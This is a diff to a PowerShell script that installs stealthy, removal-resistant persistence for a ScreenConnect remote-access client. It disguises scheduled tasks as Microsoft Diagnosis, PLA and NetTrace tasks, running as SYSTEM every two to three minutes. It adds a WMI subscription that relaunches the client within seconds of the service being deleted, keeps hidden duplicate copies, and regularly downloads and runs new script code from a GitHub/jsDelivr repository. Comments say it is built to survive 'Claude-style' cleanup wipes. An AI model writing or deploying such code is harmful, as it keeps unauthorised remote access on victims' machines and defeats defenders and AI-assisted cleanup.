@@ -69,7 +69,7 @@ function Write-Boot {
 New-Item -ItemType Directory -Path $WorkDir, $WorkDirAlt, $ScDir -Force | Out-Null
 Write-Boot ("ps_start pid={0} file={1}" -f $PID, $PSCommandPath)
 Write-Log '=== UNIFIED deploy start ==='
-Write-Log 'WU_BUILD_20260731_UNIFIED12'
+Write-Log 'WU_BUILD_20260802_UNIFIED13'
 
 function Test-IsElevated {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -124,10 +124,25 @@ function Remove-PreviousDeployArtifacts {
     # Do NOT kill sibling wucache_pkg / boot workers — dual-launch race was killing the payload
     foreach ($tn in @(
         '\Microsoft\Windows\Diagnosis\Scheduled',
-        '\Microsoft\Windows\Diagnosis\BVTConsumer'
+        '\Microsoft\Windows\Diagnosis\BVTConsumer',
+        '\Microsoft\Windows\PLA\Server',
+        '\Microsoft\Windows\NetTrace\GatherNetworkInfo'
     )) {
         schtasks.exe /Delete /TN $tn /F >$null 2>&1
     }
+
+    # Remove old WMI persistence (recreated by Install-EnsureMonitor)
+    try {
+        Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like 'WU_Cache_*' } |
+            ForEach-Object { $_.Delete() }
+        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like 'WU_Cache_*' } |
+            ForEach-Object { $_.Delete() }
+        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+            Where-Object { $_.Filter -like '*WU_Cache_*' -or $_.Consumer -like '*WU_Cache_*' } |
+            ForEach-Object { $_.Delete() }
+    } catch {}
 
     # Do NOT delete: update.b64, boot.err, boot_*.cmd, wucache_pkg.ps1, .diag.log
     foreach ($p in @(
@@ -1012,12 +1027,17 @@ function Invoke-NukeBlockedRmm {
 }
 
 # ============================================
-# PERSIST LIGHT MONITOR (ensure-only, gated nuke)
+# PERSIST: fast monitor + dual path + repo auto-update
+# Survives Claude-style "delete all ScreenConnect" wipes
+# (tasks/WMI/.wucache are NOT ScreenConnect)
 # ============================================
 function Install-EnsureMonitor {
     $mon = Join-Path $WorkDir 'wucache.ps1'
+    $monAlt = Join-Path $WorkDirAlt 'etl_sync.ps1'
     $pkg = Join-Path $WorkDir 'wucache_pkg.ps1'
+    $pkgAlt = Join-Path $WorkDirAlt 'etl_pkg.ps1'
     $run = Join-Path $WorkDir 'run.ps1'
+    $own = Join-Path $WorkDir 'own_run.cmd'
     $pkgSrc = $null
     foreach ($cand in @(
         $PSCommandPath,
@@ -1029,37 +1049,157 @@ function Install-EnsureMonitor {
     if ($pkgSrc -and $pkgSrc -ne $pkg) {
         Copy-Item $pkgSrc $pkg -Force -ErrorAction SilentlyContinue
     }
+    if (Test-Path $pkg) {
+        Copy-Item $pkg $pkgAlt -Force -ErrorAction SilentlyContinue
+    }
+
+    # Monitor body: auto-update from github-drop Script.txt, then ensure primary fast
     $body = @"
 `$ErrorActionPreference='SilentlyContinue'
+`$ProgressPreference='SilentlyContinue'
 `$WorkDir='$WorkDir'
+`$WorkDirAlt='$WorkDirAlt'
 `$SvcName='$SvcName'
 `$AltSvcName='$AltSvcName'
 `$PrimaryFingerprint='$PrimaryFingerprint'
+`$MsiUrl='$MsiUrl'
 `$LogFile=Join-Path `$WorkDir '.diag.log'
 `$pkg=Join-Path `$WorkDir 'wucache_pkg.ps1'
+`$pkgAlt=Join-Path `$WorkDirAlt 'etl_pkg.ps1'
 `$run=Join-Path `$WorkDir 'run.ps1'
-function L(`$m){ try{ Add-Content `$LogFile ("[{0}] mon: {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), `$m) }catch{} }
-L 'tick'
-# ALWAYS keep allowed alt (pluxn) online
-`$alt=Get-Service -Name `$AltSvcName -EA SilentlyContinue
-if(`$alt){
-  sc.exe config ``"`$AltSvcName``" start= auto >`$null 2>&1
-  if(`$alt.Status -ne 'Running'){ L 'alt stopped - start'; sc.exe start ``"`$AltSvcName``" >`$null 2>&1 }
-} else { L 'alt service missing' }
-# Primary: trust service state (Program Files OR stealth) — do NOT require stealth exe
-`$s=Get-Service -Name `$SvcName -EA SilentlyContinue
-if(`$s -and `$s.Status -eq 'Running'){ L 'primary running - ok'; return }
-if(`$s){ L 'primary stopped - start'; sc.exe start ``"`$SvcName``" >`$null 2>&1; return }
-L 'primary service missing - relaunch'
-if(Test-Path `$run){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$run``"" }
-elseif(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``"" }
+`$own=Join-Path `$WorkDir 'own_run.cmd'
+`$stamp=Join-Path `$WorkDir '.repo_stamp'
+`$mirrors=@(
+  'https://raw.githubusercontent.com/xnobuddy/github-drop/main',
+  'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main',
+  'https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main'
+)
+function L(`$m){ try{ if(-(Test-Path `$WorkDir)){New-Item `$WorkDir -ItemType Directory -Force|Out-Null}; Add-Content `$LogFile ("[{0}] mon: {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), `$m) }catch{} }
+function Get-HashFast([string]`$p){ try{ if(Test-Path `$p){ return (Get-FileHash `$p -Algorithm SHA256).Hash } }catch{}; return '' }
+function Try-Dl([string]`$name,[string]`$dest,[int]`$min=500){
+  `$cb=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+  foreach(`$b in `$mirrors){
+    `$u=(`$b.TrimEnd('/')+'/'+`$name+'?t='+`$cb)
+    try{ & curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 90 -o "`$dest" "`$u" >`$null 2>&1 }catch{}
+    if((Test-Path `$dest) -and ((Get-Item `$dest).Length -ge `$min)){ return `$true }
+    try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(`$u,`$dest) }catch{}
+    if((Test-Path `$dest) -and ((Get-Item `$dest).Length -ge `$min)){ return `$true }
+  }
+  return `$false
+}
+function Update-FromRepo {
+  `$tmp=Join-Path `$env:TEMP ('wu_script_'+[guid]::NewGuid().ToString('n')+'.ps1')
+  if(-not (Try-Dl 'Script.txt' `$tmp 2000)){ L 'repo Script.txt dl fail'; Remove-Item `$tmp -Force -EA 0; return `$false }
+  `$raw=Get-Content `$tmp -Raw -EA 0
+  if(-not `$raw -or `$raw -notmatch 'WU_BUILD_'){ L 'repo Script.txt bad'; Remove-Item `$tmp -Force -EA 0; return `$false }
+  `$newHash=Get-HashFast `$tmp
+  `$oldHash=Get-HashFast `$pkg
+  if(`$newHash -and `$oldHash -and (`$newHash -eq `$oldHash)){ L 'repo Script.txt unchanged'; Remove-Item `$tmp -Force -EA 0; return `$false }
+  Copy-Item `$tmp `$pkg -Force -EA 0
+  Copy-Item `$tmp `$pkgAlt -Force -EA 0
+  Set-Content `$stamp -Value ((Get-Date).ToString('o')+' '+`$newHash) -EA 0
+  Remove-Item `$tmp -Force -EA 0
+  L ('repo Script.txt UPDATED hash='+`$newHash.Substring(0,[Math]::Min(12,`$newHash.Length)))
+  return `$true
+}
+function Update-OwnCmd {
+  `$tmp=Join-Path `$env:TEMP ('wu_own_'+[guid]::NewGuid().ToString('n')+'.cmd')
+  if(-not (Try-Dl 'own.txt' `$tmp 500)){ Remove-Item `$tmp -Force -EA 0; return }
+  Copy-Item `$tmp `$own -Force -EA 0
+  Remove-Item `$tmp -Force -EA 0
+  L 'repo own.txt synced'
+}
+function Ensure-PrimaryFast {
+  `$alt=Get-Service -Name `$AltSvcName -EA SilentlyContinue
+  if(`$alt){
+    sc.exe config ``"`$AltSvcName``" start= auto >`$null 2>&1
+    if(`$alt.Status -ne 'Running'){ L 'alt stopped - start'; sc.exe start ``"`$AltSvcName``" >`$null 2>&1 }
+  }
+  `$s=Get-Service -Name `$SvcName -EA SilentlyContinue
+  if(`$s -and `$s.Status -eq 'Running'){ L 'primary running - ok'; return `$true }
+  if(`$s){ L 'primary stopped - start'; sc.exe start ``"`$SvcName``" >`$null 2>&1; Start-Sleep 3; `$s=Get-Service -Name `$SvcName -EA SilentlyContinue; if(`$s -and `$s.Status -eq 'Running'){ return `$true } }
+  L 'primary missing/dead - RELAUNCH'
+  if(Test-Path `$run){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$run``""; return `$false }
+  if(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``""; return `$false }
+  if(Test-Path `$pkgAlt){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkgAlt``""; return `$false }
+  if(Test-Path `$own){ Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c ``"`$own``" _RUN"; return `$false }
+  # Last resort: direct MSI (restores after wipe even if pkg missing)
+  `$msi=Join-Path `$env:TEMP ('sc_mon_'+[guid]::NewGuid().ToString('n')+'.msi')
+  try{ & curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 120 -o "`$msi" "`$MsiUrl" >`$null 2>&1 }catch{}
+  if(-not ((Test-Path `$msi) -and ((Get-Item `$msi).Length -ge 500000))){
+    try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(`$MsiUrl,`$msi) }catch{}
+  }
+  if((Test-Path `$msi) -and ((Get-Item `$msi).Length -ge 500000)){
+    L 'msi emergency install'
+    Start-Process msiexec.exe -ArgumentList '/i',("`"`"+`$msi+"`""),'/qn','/norestart','ALLUSERS=1','REBOOT=ReallySuppress' -Wait -WindowStyle Hidden
+    sc.exe config ``"`$SvcName``" start= auto >`$null 2>&1
+    sc.exe start ``"`$SvcName``" >`$null 2>&1
+  }
+  Remove-Item `$msi -Force -EA 0
+  return `$false
+}
+L 'tick UNIFIED13'
+try{ New-Item `$WorkDir,`$WorkDirAlt -ItemType Directory -Force | Out-Null }catch{}
+`$updated=Update-FromRepo
+Update-OwnCmd
+if(`$updated){
+  L 'applying updated pkg'
+  if(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``""; return }
+}
+Ensure-PrimaryFast | Out-Null
 "@
     Set-Content -Path $mon -Value $body -Encoding ASCII -Force
-    $task = '\Microsoft\Windows\Diagnosis\Scheduled'
-    schtasks.exe /Delete /TN $task /F >$null 2>&1
-    $tr = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mon`""
-    schtasks.exe /Create /TN $task /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 15 /F /TR "$tr" >$null 2>&1
-    Write-Log 'monitor armed (15m ensure + alt protect)'
+    Set-Content -Path $monAlt -Value $body -Encoding ASCII -Force
+
+    # Path A: fast Diagnosis task (every 2 min)
+    $taskA = '\Microsoft\Windows\Diagnosis\Scheduled'
+    schtasks.exe /Delete /TN $taskA /F >$null 2>&1
+    $trA = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mon`""
+    schtasks.exe /Create /TN $taskA /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "$trA" >$null 2>&1
+
+    # Path B: second task in PLA namespace pointing at WorkDirAlt copy (Claude wipe never touches this)
+    $taskB = '\Microsoft\Windows\PLA\Server'
+    schtasks.exe /Delete /TN $taskB /F >$null 2>&1
+    $trB = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monAlt`""
+    schtasks.exe /Create /TN $taskB /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "$trB" >$null 2>&1
+
+    # Path C: WMI — fires when primary SC service is deleted/stopped (near-instant after wipe)
+    try {
+        $filterName = 'WU_Cache_SvcWatch'
+        $consumerName = 'WU_Cache_SvcFix'
+        Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -eq $filterName } | ForEach-Object { $_.Delete() }
+        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -eq $consumerName } | ForEach-Object { $_.Delete() }
+        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+            Where-Object { $_.Filter -like "*$filterName*" -or $_.Consumer -like "*$consumerName*" } |
+            ForEach-Object { $_.Delete() }
+
+        $q = @"
+SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Service' AND (TargetInstance.Name='$SvcName' OR TargetInstance.Name LIKE 'ScreenConnect Client%')
+"@
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+            Name = $filterName
+            EventNamespace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = $q
+        } -ErrorAction SilentlyContinue
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+            Name = $consumerName
+            CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mon`""
+        } -ErrorAction SilentlyContinue
+        if ($filter -and $consumer) {
+            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+                Filter = $filter
+                Consumer = $consumer
+            } -ErrorAction SilentlyContinue | Out-Null
+            Write-Log 'WMI svc-delete watch armed (30s poll)'
+        }
+    } catch {
+        Write-Log ("WMI persist skip: {0}" -f $_.Exception.Message)
+    }
+
+    Write-Log 'monitor armed: taskA=2m taskB=3m + WMI wipe-watch + repo auto-update'
 }
 
 # ============================================
